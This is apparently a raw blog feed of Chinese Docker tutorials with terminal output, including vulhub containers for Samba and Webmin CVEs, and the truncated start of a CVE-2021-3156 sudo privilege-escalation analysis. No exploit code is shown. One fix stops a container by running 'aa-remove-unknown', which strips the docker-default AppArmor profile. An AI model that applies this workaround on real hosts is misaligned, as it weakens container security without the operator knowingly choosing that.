sha256:a8fb85c4ee4f9bed694f125932ec8778b6957231a1ce991433cb3260b3564a01Deleted: sha256:b97a4adab2d5fa2d33b61addd14c1ea96279f2f76f5bc5a72609ed679778cd4eDeleted: sha256:fd95118eade99a75b949f634a0994e0f0732ff18c2573fabdfc8d4f95b092f0eUntagged: mysql:5.7Untagged: mysql@sha256:16e159331007eccc069822f7b731272043ed572a79a196a05ffa2ea127caaf67Deleted: sha256:a3d35804fa376a141b9a9dad8f5534c3179f4c328d6efc67c5c5145d257c291aDeleted: sha256:42290dc0a51f9f9e1786ab2a69970256cdfc5a223cf661fbed00f499c5827686Deleted: sha256:d3019658b6b4765d6bb0ed640df1c5f4dba3fc0c28455571aa5d760f96f98dbaDeleted: sha256:31b06d3211cd278c5f51411f57678783181d990be2cad29fb93a6ccdf9e58103Deleted: sha256:2dfc45a2fa416c9a9d8e5eca5507872dce078db1512d7a88d97bfd77381b2e3cDeleted: sha256:dcf540992968905f3438e7501a12d0611838e3d3caaa20825d9e6d563f673e62Deleted: sha256:60be3170bc434f37a72650733e6aeded244caca00a3e26e861f34b2cbaa2f929Deleted: sha256:0df6aacada966ced14045a888d90c35add50f5570b7cb2514443c8259b84f7b0Deleted: sha256:b2bef848a7a96226ac5ef5b353969b59aac696e1bbf193cb48a93b20bcdc943dDeleted: sha256:b4bab32bc9b5428316c93f55e033d052b99c202fab743399fc6343cd6bbd12feDeleted: sha256:9bd0f840c2881cd90012b2b0333086dcd94d7683bd55bc4ea4a7beb9a96efafbDeleted: sha256:6be90f1a2d3f1eb115203b6adb2ce1014fab9a9f8f1b2afa31343397063603d3root@ubuntu:/home/test# docker images -aREPOSITORY      TAG       IMAGE ID       CREATED       SIZEvulhub/webmin   1.910     8a2b31a69f9a   2 years ago   315MBvulhub/samba    4.6.3     e37802d9a4e5   4 years ago   622MB</code></pre><blockquote><p>docker rmi -f $(docker images -aq)</p></blockquote><pre class=" language-shell"><code class="language-shell">删除所有。先用 docker images -aq 查询出所有镜像，再使用 docker rmi -f 递归删除。</code></pre><h3 id="运行镜像"><a href="#运行镜像" class="headerlink" title="运行镜像"></a>运行镜像</h3><blockquote><p>docker run</p></blockquote><pre class=" language-shell"><code class="language-shell">docker run [参数] 镜像名参数--name=="名字"：指定容器的名称，如果正在运行该名称的容器，会报错。--rm：用完即删除，通常用来测试。-d：后台方式运行。-it：使用交互方式运行，可以进入容器查看内容。-e：指定运行环境。-P：随机指定端口。-p：指定容器的端口，如：-p 8080:8080。还可以有以下写法：-p ip:主机端口:容器端口-p 主机端口:容器端口-p 容器端口</code></pre><blockquote><p>docker run -it centos /bin/bash   #进入容器交互模式</p></blockquote><pre class=" language-shell"><code class="language-shell">root@ubuntu:/home/test# docker run -it centos /bin/bashUnable to find image 'centos:latest' locally #检索本地镜像，发现没有该镜像，则去仓库中搜索。latest: Pulling from library/centosa1d0c7532777: Already exists Digest: sha256:a27fd8080b517143cbbbab9dfb7c8571c40d67d534bbdee55bd6c473f432b177Status: Downloaded newer image for centos:latest[root@4866999d2709 /]# ls #容器内的centosbin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var# 由于是以交互方式运行，且进入 /bin/bash 中，此时的路径即为 centos 容器中的 /bin/bash</code></pre><blockquote><p>docker run -d 镜像  #后台启动</p></blockquote><pre class=" language-shell"><code class="language-shell">test@ubuntu:~$ sudo docker run -d  centos5e812d3202bb3e63f089edc54d58ec17d07195b407080e28e431ecd8e8cc2df5test@ubuntu:~$ sudo docker ps CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</code></pre><p>使用 <code>docker run -d</code> 启动，也并不能保证容器一定能在后台运行，如果没有前台使用，容器启动后发现自己没有提供服务，会立刻停止。</p><h2 id="容器命令"><a href="#容器命令" class="headerlink" title="容器命令"></a>容器命令</h2><h3 id="退出容器"><a href="#退出容器" class="headerlink" title="退出容器"></a>退出容器</h3><blockquote><p>exit 退出容器停止</p></blockquote><pre class=" language-shell"><code class="language-shell">[root@4866999d2709 /]# lsbin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var[root@4866999d2709 /]# exitexitroot@ubuntu:/home/test# </code></pre><blockquote><p>Ctrl + P + Q 退出后容器不停止.</p></blockquote><pre class=" language-shell"><code class="language-shell">root@ubuntu:/home/test# docker run -it centos /bin/bash[root@144a5910f25f /]# root@ubuntu:/home/test# docker ps#此时即为使用 Ctrl + P + Q 快捷键的效果CONTAINER ID   IMAGE     COMMAND       CREATED          STATUS          PORTS     NAMES144a5910f25f   centos    "/bin/bash"   42 seconds ago   Up 41 seconds             upbeat_hamilton</code></pre><h3 id="查看容器"><a href="#查看容器" class="headerlink" title="查看容器"></a>查看容器</h3><blockquote><p>docker ps</p></blockquote><pre class=" language-shell"><code class="language-shell">docker ps [参数]参数-a：查看所有容器（包括正在运行的和已经停止的）。-n：显示最近创建的容器，设置显示个数。-q：只显示容器的编号。</code></pre><blockquote><p>docker ps     查看正在运行docker</p></blockquote><pre class=" language-shell"><code class="language-shell">root@ubuntu:/home/test# docker psCONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</code></pre><blockquote><p>docker ps -a 查看所有容器(包括运行和不运行)</p></blockquote><pre class=" language-shell"><code class="language-shell">root@ubuntu:/home/test# docker ps -aCONTAINER ID   IMAGE                 COMMAND                  CREATED          STATUS                      PORTS                                                                                                    NAMES4866999d2709   centos                "/bin/bash"              9 minutes ago    Exited (0) 4 minutes ago                                                                                                             heuristic_torvaldsb36280136ec4   centos                "/bin/bash"              12 minutes ago   Exited (0) 11 minutes ago                                                                                                            centos7ef8a2ff7151e   vulhub/samba:4.6.3    "/usr/local/samba/sb…"   32 hours ago     Exited (255) 25 hours ago   0.0.0.0:445->445/tcp, :::445->445/tcp, 137-138/udp, 139/tcp, 0.0.0.0:6699->6699/tcp, :::6699->6699/tcp   cve-2017-7494_samba_1399c89aef259   vulhub/webmin:1.910   "/docker-entrypoint.…"   2 months ago     Exited (255) 6 weeks ago    0.0.0.0:10000->10000/tcp, :::10000->10000/tcp                                                            cve-2019-15107_web_1</code></pre><blockquote><p>docker ps -aq 查看所有容器ID</p></blockquote><pre class=" language-shell"><code class="language-shell">root@ubuntu:/home/test# docker ps -aq4866999d2709b36280136ec4ef8a2ff7151e399c89aef259</code></pre><h3 id="运行容器"><a href="#运行容器" class="headerlink" title="运行容器"></a>运行容器</h3><blockquote><p>docker start</p></blockquote><blockquote><p>docker start  容器id  启动容器</p></blockquote><pre class=" language-shell"><code class="language-shell">root@ubuntu:/home/test# docker ps #查看运行容器CONTAINER ID   IMAGE     COMMAND       CREATED         STATUS         PORTS     NAMES144a5910f25f   centos    "/bin/bash"   4 minutes ago   Up 4 minutes             upbeat_hamiltonroot@ubuntu:/home/test# docker ps -a #查看所有记录容器CONTAINER ID   IMAGE                 COMMAND                  CREATED          STATUS                      PORTS                                                                                                    NAMES144a5910f25f   centos                "/bin/bash"              4 minutes ago    Up 4 minutes                                                                                                                         upbeat_hamilton4866999d2709   centos                "/bin/bash"              15 minutes ago   Exited (0) 11 minutes ago                                                                                                            heuristic_torvaldsb36280136ec4   centos                "/bin/bash"              18 minutes ago   Exited (0) 18 minutes ago                                                                                                            centos7ef8a2ff7151e   vulhub/samba:4.6.3    "/usr/local/samba/sb…"   33 hours ago     Exited (255) 25 hours ago   0.0.0.0:445->445/tcp, :::445->445/tcp, 137-138/udp, 139/tcp, 0.0.0.0:6699->6699/tcp, :::6699->6699/tcp   cve-2017-7494_samba_1399c89aef259   vulhub/webmin:1.910   "/docker-entrypoint.…"   2 months ago     Exited (255) 6 weeks ago    0.0.0.0:10000->10000/tcp, :::10000->10000/tcp                                                            cve-2019-15107_web_1root@ubuntu:/home/test# docker start ef8a2ff7151e #开启容器ef8a2ff7151eroot@ubuntu:/home/test# docker ps  #查看运行容器CONTAINER ID   IMAGE                COMMAND                  CREATED         STATUS         PORTS                                                                                                    NAMES144a5910f25f   centos               "/bin/bash"              4 minutes ago   Up 4 minutes                                                                                                            upbeat_hamiltonef8a2ff7151e   vulhub/samba:4.6.3   "/usr/local/samba/sb…"   33 hours ago    Up 3 seconds   0.0.0.0:445->445/tcp, :::445->445/tcp, 137-138/udp, 139/tcp, 0.0.0.0:6699->6699/tcp, :::6699->6699/tcp   cve-2017-7494_samba_1</code></pre><h3 id="停止容器"><a href="#停止容器" class="headerlink" title="停止容器"></a>停止容器</h3><blockquote><p>docker stop</p></blockquote><blockquote><p>docker stop 容器id</p></blockquote><pre class=" language-shell"><code class="language-shell">root@ubuntu:/home/test# docker ps CONTAINER ID   IMAGE                COMMAND                  CREATED         STATUS         PORTS                                                                                                    NAMES144a5910f25f   centos               "/bin/bash"              7 minutes ago   Up 7 minutes                                                                                                            upbeat_hamiltonef8a2ff7151e   vulhub/samba:4.6.3   "/usr/local/samba/sb…"   33 hours ago    Up 2 minutes   0.0.0.0:445->445/tcp, :::445->445/tcp, 137-138/udp, 139/tcp, 0.0.0.0:6699->6699/tcp, :::6699->6699/tcp   cve-2017-7494_samba_1root@ubuntu:/home/test# docker stop  ef8a2ff7151eError response from daemon: cannot stop container: ef8a2ff7151e: permission deniedroot@ubuntu:/home/test# aa-remove-unknownRemoving 'docker-default'root@ubuntu:/home/test# docker stop  ef8a2ff7151eef8a2ff7151eroot@ubuntu:/home/test# docker ps CONTAINER ID   IMAGE     COMMAND       CREATED         STATUS         PORTS     NAMES144a5910f25f   centos    "/bin/bash"   8 minutes ago   Up 8 minutes             upbeat_hamilton</code></pre><p>==关闭容器出现错误：Error response from daemon: cannot stop container: ef8a2ff7151e: permission denied==</p><p>参考链接：<a href="https://blog.csdn.net/qq_28719743/article/details/89017770">docker错误:Error response from daemon: cannot stop container_Tomatosky的博客-CSDN博客</a></p><pre class=" language-shell"><code class="language-shell">运行aa-remove-unknownroot@ubuntu:/home/test# docker stop  ef8a2ff7151eError response from daemon: cannot stop container: ef8a2ff7151e: permission deniedroot@ubuntu:/home/test# aa-remove-unknownRemoving 'docker-default'root@ubuntu:/home/test# docker stop  ef8a2ff7151eef8a2ff7151e</code></pre><h3 id="杀死容器"><a href="#杀死容器" class="headerlink" title="杀死容器"></a>杀死容器</h3><blockquote><p>docker kill</p></blockquote><blockquote><p>docker kill 容器id</p></blockquote><pre class=" language-shell"><code class="language-shell">root@ubuntu:/home/test# docker ps CONTAINER ID   IMAGE     COMMAND       CREATED          STATUS          PORTS     NAMES144a5910f25f   centos    "/bin/bash"   12 minutes ago   Up 12 minutes             upbeat_hamiltonroot@ubuntu:/home/test# docker kill 144a5910f25f144a5910f25froot@ubuntu:/home/test# docker ps CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMESroot@ubuntu:/home/test# </code></pre><h3 id="重启容器"><a href="#重启容器" class="headerlink" title="重启容器"></a>重启容器</h3><blockquote><p>docker restart</p></blockquote><blockquote><p>docker restart 容器id</p></blockquote><pre class=" language-shell"><code class="language-shell">root@ubuntu:/home/test# docker ps CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMESroot@ubuntu:/home/test# docker restart 144a5910f25f144a5910f25froot@ubuntu:/home/test# docker ps CONTAINER ID   IMAGE     COMMAND       CREATED          STATUS        PORTS     NAMES144a5910f25f   centos    "/bin/bash"   13 minutes ago   Up 1 second             upbeat_hamilton</code></pre><h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><blockquote><p>docker rm  容器id</p></blockquote><pre class=" language-shell"><code class="language-shell">root@ubuntu:~# docker psCONTAINER ID   IMAGE     COMMAND       CREATED       STATUS       PORTS     NAMES144a5910f25f   centos    "/bin/bash"   3 hours ago   Up 3 hours             upbeat_hamiltonroot@ubuntu:~# docker rm 144a5910f25fError response from daemon: You cannot remove a running container 144a5910f25f34244a7b3fb1f1f3b4548de6c1284ef2a3e7abdf4ddb7afd56c2. Stop the container before attempting removal or force removeroot@ubuntu:~# docker rm 144a5910f25f -f144a5910f25froot@ubuntu:~# docker psCONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</code></pre><h3 id="进入运行容器"><a href="#进入运行容器" class="headerlink" title="进入运行容器"></a>进入运行容器</h3><blockquote><p>docker exec [参数] 容器 路径</p></blockquote><pre class=" language-shell"><code class="language-shell">docker exec [参数] 容器 路径参数-d：后台运行。-it：交互模式进入。</code></pre><pre class=" language-shell"><code class="language-shell">test@ubuntu:~$ sudo docker ps CONTAINER ID   IMAGE                 COMMAND                  CREATED        STATUS        PORTS                                           NAMES399c89aef259   vulhub/webmin:1.910   "/docker-entrypoint.…"   2 months ago   Up 1 second   0.0.0.0:10000->10000/tcp, :::10000->10000/tcp   cve-2019-15107_web_1test@ubuntu:~$ sudo docker exec -it  399c89aef259 /bin/bashroot@399c89aef259:/# pwd/root@399c89aef259:/# </code></pre><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="把容器内文件拷贝到主机"><a href="#把容器内文件拷贝到主机" class="headerlink" title="把容器内文件拷贝到主机"></a>把容器内文件拷贝到主机</h3><blockquote><p>docker cp 容器id:容器内路径    目的主机路径</p></blockquote><pre class=" language-shell"><code class="language-shell">容器内Test  boot  docker-entrypoint.sh  home    lib64  mnt  proc  run    srv  tmp  varbin   dev   etc              lib    media  opt  root  sbin    sys  usr  webmin-setup.outroot@399c89aef259:/# cd Test/root@399c89aef259:/Test# ls1.pyroot@399c89aef259:/Test# 主机root@ubuntu:~# docker cp 399c89aef259:/Test  /root@ubuntu:~# cd /root@ubuntu:/# lsbin    dev   initrd.img      lib64       mnt   root  snap  Test                      usr      vmlinuz.oldboot   etc   initrd.img.old  lost+found  opt   run   srv   tmp                       varcdrom  home  lib             media       proc  sbin  sys   udo systemctl enable ssh  vmlinuzroot@ubuntu:/# cd Testroot@ubuntu:/Test# ls1.py</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/TZ845195485/article/details/109739141">(8条消息) DOCKER01_概述、软件安装、镜像命令、容器命令、(日志、进入容器、拷贝)、提交、push、(导入、导出)、(save、load)_所得皆惊喜的博客-CSDN博客</a></p><p><a href="https://www.kuangstudy.com/zl/1485154067163824129#1485170985606234113">Docker- 专栏 -KuangStudy</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker镜像</title>
      <link href="/2022/08/27/Docker%E9%95%9C%E5%83%8F/"/>
      <url>/2022/08/27/Docker%E9%95%9C%E5%83%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="镜像分层"><a href="#镜像分层" class="headerlink" title="镜像分层"></a>镜像分层</h1><p>Docker 镜像都是<strong>只读</strong>的，当容器启动时，一个新的可写层被加到镜像的顶部。</p><p>这一层就是我们通常说的<strong>容器层</strong>，容器层之下的都叫<strong>镜像层</strong>。</p><p><img src="https://kuangstudy.oss-cn-beijing.aliyuncs.com/bbs/2022/01/19/kuangstudy8d1de69f-280f-4372-99d5-6c0e145e24f0.png" alt="img"></p><h1 id="自定义镜像"><a href="#自定义镜像" class="headerlink" title="自定义镜像"></a>自定义镜像</h1><blockquote><p>docker  commit  [参数] 容器 [仓库[:标签]]</p></blockquote><pre class=" language-shell"><code class="language-shell">docker commit [参数] 容器 [仓库[:标签]]参数-a：作者信息。一般为 作者名字<邮箱>。-c：将 Dockerfile 指令应用于创建的映像。-m：注释信息。-p：提交期间暂停容器（默认）</code></pre><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><blockquote><p>1.启动tomcat docker run -it  –name tomcat2   -p 3355:8080 tomcat</p></blockquote><pre><code>root@ubuntu:~# docker run -it --name tomcat2   -p 3355:8080 tomcatUsing CATALINA_BASE:   /usr/local/tomcatUsing CATALINA_HOME:   /usr/local/tomcatUsing CATALINA_TMPDIR: /usr/local/tomcat/tempUsing JRE_HOME:        /usr/local/openjdk-11Using CLASSPATH:       /usr/local/tomcat/bin/bootstrap.jar:/usr/local/tomcat/bin/tomcat-juli.jarUsing CATALINA_OPTS:   NOTE: Picked up JDK_JAVA_OPTIONS:  --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED --add-opens=java.base/java.util.concurrent=ALL-UNNAMED --add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED20-May-2022 02:32:22.923 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version name:   Apache Tomcat/10.0.2120-May-2022 02:32:22.935 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server built:          May 10 2022 21:53:12 UTC20-May-2022 02:32:22.936 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version number: 10.0.21.020-May-2022 02:32:22.936 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Name:               Linux20-May-2022 02:32:22.937 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Version:            4.15.0-142-generic20-May-2022 02:32:22.938 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Architecture:          amd6420-May-2022 02:32:22.938 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Java Home:             /usr/local/openjdk-1120-May-2022 02:32:22.939 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Version:           11.0.15+1020-May-2022 02:32:22.940 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Vendor:            Oracle Corporation</code></pre><blockquote><p>2.进入容器内  docker exec -it tomcat2 /bin/bash</p></blockquote><pre class=" language-shell"><code class="language-shell">root@ubuntu:/home/test# docker exec -it tomcat2 /bin/bash #进入容器root@841da9500be3:/usr/local/tomcat# lsBUILDING.txt  CONTRIBUTING.md  LICENSE    NOTICE    README.md  RELEASE-NOTES  RUNNING.txt  bin  conf  lib  logs  native-jni-lib  temp  webapps  webapps.dist  workroot@841da9500be3:/usr/local/tomcat# cd webappsroot@841da9500be3:/usr/local/tomcat/webapps# lsroot@841da9500be3:/usr/local/tomcat/webapps# cd ..root@841da9500be3:/usr/local/tomcat# cp -r webapps.dist/* webapps/# 把webapp.dist下所有文件拷贝到  webappsroot@841da9500be3:/usr/local/tomcat# cd webappsroot@841da9500be3:/usr/local/tomcat/webapps# lsROOT  docs  examples  host-manager  manager</code></pre><blockquote><p>3.测试tomcat  curl localhost:3355</p></blockquote><pre class=" language-sshell"><code class="language-sshell">test@ubuntu:~$ curl localhost:3355<!DOCTYPE html><html lang="en">    <head>        <meta charset="UTF-8" />        <title>Apache Tomcat/10.0.21</title>        <link href="favicon.ico" rel="icon" type="image/x-icon" />        <link href="tomcat.css" rel="stylesheet" type="text/css" />    </head>    <body>        <div id="wrapper">            <div id="navigation" class="curved container">                <span id="nav-home"><a href="https://tomcat.apache.org/">Home</a></span>                <span id="nav-hosts"><a href="/docs/">Documentation</a></span>                <span id="nav-config"><a href="/docs/config/">Configuration</a></span>                <span id="nav-examples"><a href="/examples/">Examples</a></span>                <span id="nav-wiki"><a href="https://cwiki.apache.org/confluence/display/tomcat/FrontPage">Wiki</a></span>                <span id="nav-lists"><a href="https://tomcat.apache.org/lists.html">Mailing Lists</a></span>                <span id="nav-help"><a href="https://tomcat.apache.org/findhelp.html">Find Help</a></span>                <br class="separator" /></code></pre><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220520103818.png" alt="image-20220520103810990"></p><blockquote><p>4.自定义镜像 docker  commit -a=”Capital Wang” -m=” tomcat test” 841da9500be3 tomcat:1.0</p></blockquote><pre><code>docker  commit -a=&quot;Capital Wang&quot; -m=&quot;tomcat test&quot; 容器id 自定义镜像名#前root@ubuntu:/home/test# docker imagesREPOSITORY      TAG       IMAGE ID       CREATED        SIZEtomcat          latest    5eb506608219   2 days ago     685MBnginx           latest    de2543b9436b   2 days ago     142MBcentos          latest    5d0da3dc9764   8 months ago   231MBvulhub/webmin   1.910     8a2b31a69f9a   2 years ago    315MBvulhub/samba    4.6.3     e37802d9a4e5   4 years ago    622MB#后root@ubuntu:/home/test# docker  commit -a=&quot;Capital Wang&quot; -m=&quot; tomcat test&quot; 841da9500be3 tomcat:1.0sha256:74337e9da0f7a36347e0895f0065bd4f60740b884045e48e217185540134c0d6root@ubuntu:/home/test# docker imagesREPOSITORY      TAG       IMAGE ID       CREATED         SIZEtomcat          1.0       74337e9da0f7   3 seconds ago   689MBtomcat          latest    5eb506608219   2 days ago      685MBnginx           latest    de2543b9436b   2 days ago      142MBcentos          latest    5d0da3dc9764   8 months ago    231MBvulhub/webmin   1.910     8a2b31a69f9a   2 years ago     315MBvulhub/samba    4.6.3     e37802d9a4e5   4 years ago     622MB</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker概述</title>
      <link href="/2022/08/26/docker%E6%A6%82%E8%BF%B0/"/>
      <url>/2022/08/26/docker%E6%A6%82%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker-概述"><a href="#Docker-概述" class="headerlink" title="Docker 概述"></a>Docker 概述</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220519105050.png" alt="image-20220519105049876"></p><p>官网：<a href="https://www.docker.com/">https://www.docker.com/</a></p><p>文档：<a href="https://docs.docker.com/docker-for-windows/">https://docs.docker.com/docker-for-windows/</a></p><p>命令：<a href="https://docs.docker.com/engine/reference/run/">https://docs.docker.com/engine/reference/run/</a></p><p>仓库：<a href="https://hub.docker.com/">https://hub.docker.com/</a></p><p>Docker 是一个开源的应用容器引擎。</p><p>Docker 的思想来自于集装箱，彼此之间隔离。</p><p>Docker 通过隔离机制，可以将服务器利用到极致。</p><p>Docker 容器完全使用沙箱机制，相互之间不会有任何接口</p><h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><blockquote><p>Docker 由 镜像，容器，仓库组成。</p></blockquote><p><img src="https://kuangstudy.oss-cn-beijing.aliyuncs.com/bbs/2022/01/23/kuangstudyebb6ebca-b5f3-45ce-ae06-ee9899fa0398.png" alt="img"></p><ol><li><strong>镜像</strong>：Docker 镜像好比一个模板，可以用来创建<strong>容器</strong>（container），==一个镜像可以创建多个容器==。</li><li><strong>容器</strong>：Docker 利用容器(Container)独立运行的一个或一组应用。容器是用镜像创建的运行实例。可以把==容器看做是一个简易版的 Linux 环境==(包括root用户权限、进程空间、用户空间和网络空间等)和运行在其中的应用程序。</li><li><strong>仓库</strong>：存放镜像的地方。</li></ol><h2 id="底层原理"><a href="#底层原理" class="headerlink" title="底层原理"></a>底层原理</h2><p>Docker 是一个 <strong>Client-Server</strong> 结构的系统。</p><p>Docker 的守护进程运行在主机上，通过 Socket 从客户端访问。</p><p>Docker Server 接受 <strong>Docker-Client</strong> 的指令。</p><p><img src="https://kuangstudy.oss-cn-beijing.aliyuncs.com/bbs/2022/01/23/kuangstudy5375096a-4612-4fae-a76c-83c4e82d817b.png" alt="img"></p><h2 id="和虚拟机区别"><a href="#和虚拟机区别" class="headerlink" title="和虚拟机区别"></a>和虚拟机区别</h2><p>==Docker 使用的容器化技术 本质上都是虚拟化==</p><blockquote><p>虚拟机原理</p></blockquote><p><img src="https://kuangstudy.oss-cn-beijing.aliyuncs.com/bbs/2022/01/23/kuangstudy2c1ac099-6cb4-48f4-9e18-356538ee7b40.png" alt="img"></p><p>它有以下明显的缺点：</p><ul><li><strong>资源占用多</strong>。启动虚拟机非常占内存，对电脑资源有不小的占用。</li><li><strong>冗余步骤多</strong>。启动虚拟机后，还需要进行一些步骤才能进入系统，效率比较低。</li><li><strong>启动很慢</strong>。由于虚拟机是虚拟化一整个系统，其启动时间会比较缓慢，一般都需要几分钟。</li></ul><blockquote><p>容器化原理</p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220519115350.png" alt="image-20220519115350733"></p><p><strong>docker</strong>利用的是宿主机的内核,而不需要Guest OS。因此,当新建一个容器时,docker不需要和虚拟机一样重新加载一个操作系统内核。</p><blockquote><p>区别</p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220519115515.png" alt="image-20220519115515244"></p><blockquote><p>为什么快</p></blockquote><p><img src="https://kuangstudy.oss-cn-beijing.aliyuncs.com/bbs/2022/01/23/kuangstudyb69524e7-a8fc-4517-b7ba-c8ac22752ae7.png" alt="img"></p><p>Docker 有着比 VM 更少的抽象层。</p><p>Docker 主要用的是宿主机的内核，而 VM 需要 <strong>Guest OS</strong>。</p><p>新建容器的时候，Docker 不需要像 VM 一样重新加载一个操作系统内核，避免了引导的过程。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p>参考链接：<a href="https://blog.csdn.net/TZ845195485/article/details/109739141">(8条消息) DOCKER01_概述、软件安装、镜像命令、容器命令、(日志、进入容器、拷贝)、提交、push、(导入、导出)、(save、load)_所得皆惊喜的博客-CSDN博客</a></p><p>参考链接：<a href="https://www.kuangstudy.com/zl/1485154067163824129#1485154413953073153">Docker- 专栏 -KuangStudy</a></p><p>视频链接：<a href="https://www.bilibili.com/video/BV1og4y1q7M4?p=4">【狂神说Java】Docker最新超详细版教程通俗易懂_哔哩哔哩_bilibili</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-3156 sudo提权</title>
      <link href="/2022/06/09/CVE-2021-3156-sudo%E6%8F%90%E6%9D%83/"/>
      <url>/2022/06/09/CVE-2021-3156-sudo%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2021-3156-sudo提权"><a href="#CVE-2021-3156-sudo提权" class="headerlink" title="CVE-2021-3156 sudo提权"></a>CVE-2021-3156 sudo提权</h1><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><blockquote><p>linux 的sudo详解</p></blockquote><p><code>sudo</code>命令的主要作用是允许特定的用户以root用户或其他用户的身份执行命令</p><blockquote><p>linux中sudo文件格式</p></blockquote><pre class=" language-bash"><code class="language-bash">user1 ALL<span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span>  ALL<span class="token comment" spellcheck="true">#我们来说一下这一行的配置的意思</span><span class="token comment" spellcheck="true">#user1 表示该用户user1可以使用sudo命令，第一个ALL指的是网络中的主机（可以是主机名也可以是ip地址），它指明user1用户可以在此主机上执行后面命令；第二个括号里的ALL是指目标用户，也就是以谁的身份去执行命令。最后一个ALL是指命令路径。</span>user1 localhost<span class="token operator">=</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>  /bin/kill<span class="token comment" spellcheck="true">#表示user1用户可以在本地以root的身份去执行kill命令</span><span class="token comment" spellcheck="true">#注意： 命令必须是完整的路径</span></code></pre><p>参考链接：<a href="https://www.cnblogs.com/yanling-coder/p/10947157.html">https://www.cnblogs.com/yanling-coder/p/10947157.html</a></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><blockquote><p>1.sudo.c   main函数</p></blockquote><p><code>sudo.c中的main 函数(sudo.c: 133)</code> </p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> nargc<span class="token punctuation">,</span> ok<span class="token punctuation">,</span> status <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>nargv<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token operator">*</span>env_add<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>user_info<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token operator">*</span>command_info<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token operator">*</span>argv_out<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token operator">*</span>user_env_out<span class="token punctuation">;</span>    <span class="token keyword">struct</span> sudo_settings <span class="token operator">*</span>settings<span class="token punctuation">;</span>    <span class="token keyword">struct</span> plugin_container <span class="token operator">*</span>plugin<span class="token punctuation">,</span> <span class="token operator">*</span>next<span class="token punctuation">;</span>    sigset_t mask<span class="token punctuation">;</span>    <span class="token function">debug_decl_vars</span><span class="token punctuation">(</span>main<span class="token punctuation">,</span> SUDO_DEBUG_MAIN<span class="token punctuation">)</span>    ··· ···    ··· ···    <span class="token comment" spellcheck="true">/* Parse command line arguments. */</span>    <span class="token comment" spellcheck="true">//在这里处理输入参数，设置sudo_mode</span>    sudo_mode <span class="token operator">=</span> <span class="token function">parse_args</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> <span class="token operator">&amp;</span>nargc<span class="token punctuation">,</span> <span class="token operator">&amp;</span>nargv<span class="token punctuation">,</span> <span class="token operator">&amp;</span>settings<span class="token punctuation">,</span> <span class="token operator">&amp;</span>env_add<span class="token punctuation">)</span><span class="token punctuation">;</span>        ··· ···    ··· ···            <span class="token keyword">switch</span> <span class="token 